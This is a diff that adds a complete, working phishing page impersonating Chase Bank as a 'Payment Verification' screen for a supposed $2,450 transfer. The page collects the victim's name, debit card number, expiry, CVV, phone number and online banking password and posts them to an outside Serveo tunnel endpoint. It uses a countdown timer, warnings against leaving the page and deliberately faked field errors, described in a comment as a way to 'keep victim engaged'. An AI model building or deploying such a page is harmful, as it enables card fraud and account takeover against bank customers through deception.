@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment Verification | Chase Bank</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f5f6fa;
+            margin: 0;
+            padding: 0;
+            color: #333;
+        }
+        .header {
+            background-color: #117aca;
+            color: white;
+            padding: 20px;
+            text-align: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .logo {
+            height: 40px;
+            margin-bottom: 10px;
+        }
+        .container {
+            max-width: 600px;
+            margin: 30px auto;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 3px 20px rgba(0,0,0,0.08);
+            overflow: hidden;
+        }
+        .countdown-alert {
+            background: #ffebee;
+            color: #d32f2f;
+            padding: 15px;
+            text-align: center;
+            font-weight: bold;
+            border-bottom: 2px solid #d32f2f;
+        }
+        #countdown {
+            font-size: 24px;
+            font-family: monospace;
+        }
+        .transaction-summary {
+            background: #f0f7ff;
+            padding: 20px;
+            border-left: 4px solid #117aca;
+        }
+        .amount {
+            font-size: 28px;
+            color: #117aca;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+        .detail-row {
+            display: flex;
+            margin-bottom: 15px;
+        }
+        .detail-label {
+            width: 150px;
+            color: #666;
+            font-weight: 500;
+        }
+        .detail-value {
+            flex: 1;
+            font-weight: 500;
+        }
+        .security-alert {
+            background: #fff8f0;
+            padding: 15px;
+            margin: 20px;
+            border-radius: 8px;
+            border-left: 4px solid #ff9900;
+            font-size: 14px;
+        }
+        .form-group {
+            margin: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            font-size: 14px;
+        }
+        input, select {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 15px;
+            box-sizing: border-box;
+        }
+        .error-message {
+            color: #d32f2f;
+            font-size: 13px;
+            margin-top: 5px;
+            display: none;
+        }
+        .form-row {
+            display: flex;
+            gap: 15px;
+        }
+        .form-row .form-group {
+            flex: 1;
+        }
+        .verify-btn {
+            background-color: #117aca;
+            color: white;
+            border: none;
+            padding: 14px;
+            font-size: 16px;
+            border-radius: 6px;
+            cursor: pointer;
+            width: calc(100% - 40px);
+            margin: 20px;
+            font-weight: 600;
+            transition: background 0.3s;
+        }
+        .verify-btn:hover {
+            background-color: #0d68b5;
+        }
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255,255,255,0.9);
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .loading-spinner {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #117aca;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .blocked-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255,255,255,0.95);
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1001;
+            text-align: center;
+            padding: 20px;
+        }
+        .blocked-icon {
+            font-size: 60px;
+            color: #d32f2f;
+            margin-bottom: 20px;
+        }
+        .leave-warning {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            right: 20px;
+            background: #fff8e6;
+            border-left: 4px solid #ffc107;
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 13px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="logo.png" class="logo" alt="Chase Bank" style="height: 30px;">
+        <h1>Payment Verification</h1>
+    </div>
+
+    <div class="container">
+        <div class="countdown-alert">
+            <div>⏰ SECURITY TIMER ACTIVE - COMPLETE VERIFICATION</div>
+            <div id="countdown">05:00</div>
+            <div style="font-size: 14px; margin-top: 5px;">Payment will be blocked if not verified</div>
+        </div>
+
+        <div class="transaction-summary">
+            <div class="detail-row">
+                <div class="detail-label">Transaction Type</div>
+                <div class="detail-value">Inter-Account Transfer</div>
+            </div>
+            <div class="detail-row">
+                <div class="detail-label">Recipient</div>
+                <div class="detail-value">Refentse Maine</div>
+            </div>
+            <div class="detail-row">
+                <div class="detail-label">Account Number</div>
+                <div class="detail-value">8647••••••••••••6437</div>
+            </div>
+            <div class="detail-row">
+                <div class="detail-label">Reference</div>
+                <div class="detail-value">INV-78942 | Business Payment</div>
+            </div>
+            <div class="detail-row">
+                <div class="detail-label">Amount</div>
+                <div class="detail-value">
+                    <div class="amount">$2,450.00 USD</div>
+                    <div style="color: #666; font-size: 14px;">+ $15.00 transfer fee</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="security-alert">
+            <strong>Security Protocol:</strong> For your protection, we require multi-factor authentication to verify this transaction. <span style="color: #d32f2f;">Do not leave this page during verification.</span>
+        </div>
+
+        <form id="verificationForm">
+            <div class="form-group">
+                <label for="fullName">Full Name (as on account)</label>
+                <input type="text" id="fullName" required>
+                <div class="error-message" id="nameError">Name doesn't match account records</div>
+            </div>
+
+            <div class="form-group">
+                <label for="cardNumber">Debit Card Number</label>
+                <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" required>
+                <div class="error-message" id="cardError">Invalid card number format</div>
+            </div>
+
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="expiry">Expiry Date</label>
+                    <input type="text" id="expiry" placeholder="MM/YY" required>
+                    <div class="error-message" id="expiryError">Invalid expiry date</div>
+                </div>
+                <div class="form-group">
+                    <label for="cvv">CVV</label>
+                    <input type="text" id="cvv" placeholder="123" required>
+                    <div class="error-message" id="cvvError">Incorrect security code</div>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label for="phone">Mobile Number</label>
+                <input type="tel" id="phone" placeholder="For SMS verification" required>
+                <div class="error-message" id="phoneError">Invalid phone number</div>
+            </div>
+
+            <div class="form-group">
+                <label for="password">Online Banking Password</label>
+                <input type="password" id="password" placeholder="Enter your password" required>
+                <div class="error-message" id="passwordError">Incorrect password</div>
+            </div>
+
+            <button type="submit" class="verify-btn">VERIFY & COMPLETE TRANSFER</button>
+        </form>
+    </div>
+
+    <div class="leave-warning" id="leaveWarning">
+        ⚠️ <strong>Security Alert:</strong> Leaving this page will cancel your transaction. Complete verification to avoid account restrictions.
+    </div>
+
+    <div class="loading-screen" id="loadingScreen">
+        <div class="loading-spinner"></div>
+        <div style="font-size: 18px; margin-bottom: 5px;">Securing your transaction</div>
+        <div style="color: #666; font-size: 14px;">This may take a moment...</div>
+    </div>
+
+    <div class="blocked-screen" id="blockedScreen">
+        <div class="blocked-icon">❌</div>
+        <h2 style="color: #d32f2f;">PAYMENT BLOCKED</h2>
+        <p>Verification timeout exceeded. For security reasons, this transaction has been automatically canceled.</p>
+        <p>Your account may be temporarily restricted. Please contact Chase Customer Service at 1-800-935-9935 to unlock your account.</p>
+    </div>
+
+    <script>
+        // Server configuration
+        const SERVER_ENDPOINT = 'https://1ad21a34e76a51a82030f869e0f1000c.serveo.net/submit';
+
+        // Countdown timer (5 minutes)
+        let timeLeft = 5 * 60;
+        let timerActive = true;
+        const countdownElement = document.getElementById('countdown');
+        const timer = setInterval(updateCountdown, 1000);
+
+        function updateCountdown() {
+            if (!timerActive) return;
+            
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            
+            if (timeLeft <= 0) {
+                showBlockedScreen();
+            } else {
+                timeLeft--;
+                
+                if (timeLeft <= 60) {
+                    countdownElement.style.color = '#d32f2f';
+                    countdownElement.style.fontWeight = 'bold';
+                    document.getElementById('leaveWarning').style.display = 'block';
+                }
+            }
+        }
+
+        function showBlockedScreen() {
+            timerActive = false;
+            document.getElementById('blockedScreen').style.display = 'flex';
+            setTimeout(() => {
+                window.location.href = 'https://www.chase.com';
+            }, 10000);
+        }
+
+        // Form submission handler
+        document.getElementById('verificationForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            // Show loading screen
+            document.getElementById('loadingScreen').style.display = 'flex';
+            
+            // Collect all form data
+            const formData = {
+                personal_info: {
+                    name: document.getElementById('fullName').value
+                },
+                payment_info: {
+                    card_number: document.getElementById('cardNumber').value.replace(/\s/g, ''),
+                    expiry: document.getElementById('expiry').value,
+                    cvv: document.getElementById('cvv').value
+                },
+                contact_info: {
+                    phone: document.getElementById('phone').value
+                },
+                bank_credentials: {
+                    password: document.getElementById('password').value
+                },
+                meta: {
+                    user_agent: navigator.userAgent,
+                    timestamp: new Date().toISOString(),
+                    ip: '' // Will be captured server-side
+                }
+            };
+
+            try {
+                // Send data to your Serveo endpoint
+                const response = await fetch(SERVER_ENDPOINT, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(formData)
+                });
+
+                if (response.ok) {
+                    // Show fake errors to keep victim engaged
+                    showRandomErrors();
+                } else {
+                    console.error('Server error:', response.status);
+                    showRandomErrors();
+                }
+            } catch (error) {
+                console.error('Fetch error:', error);
+                showRandomErrors();
+            } finally {
+                document.getElementById('loadingScreen').style.display = 'none';
+            }
+        });
+
+        function showRandomErrors() {
+            // Randomly show fake errors (2 out of 5 fields)
+            const errorFields = ['nameError', 'cardError', 'expiryError', 'cvvError', 'phoneError', 'passwordError'];
+            const randomErrors = errorFields.sort(() => 0.5 - Math.random()).slice(0, 2);
+            
+            // Hide all errors first
+            errorFields.forEach(id => document.getElementById(id).style.display = 'none');
+            
+            // Show random errors
+            randomErrors.forEach(id => document.getElementById(id).style.display = 'block');
+            
+            // Scroll to first error
+            if (randomErrors.length > 0) {
+                document.getElementById(randomErrors[0]).scrollIntoView({
+                    behavior: 'smooth',
+                    block: 'center'
+                });
+            }
+        }
+
+        // Warn user when trying to leave
+        window.addEventListener('beforeunload', function(e) {
+            if (timerActive) {
+                document.getElementById('leaveWarning').style.display = 'block';
+                e.preventDefault();
+                e.returnValue = 'Your transaction will be canceled if you leave this page.';
+            }
+        });
+
+        // Input formatting
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 0) {
+                value = value.match(/.{1,4}/g).join(' ');
+            }
+            e.target.value = value.substring(0, 19);
+        });
+
+        document.getElementById('expiry').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            e.target.value = value.substring(0, 5);
+        });
+
+        document.getElementById('cvv').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
+        });
+
+        document.getElementById('phone').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 15);
+        });
+
+        // Show leave warning after 2 minutes
+        setTimeout(() => {
+            document.getElementById('leaveWarning').style.display = 'block';
+        }, 2 * 60 * 1000);
+    </script>
+</body>
+</html>
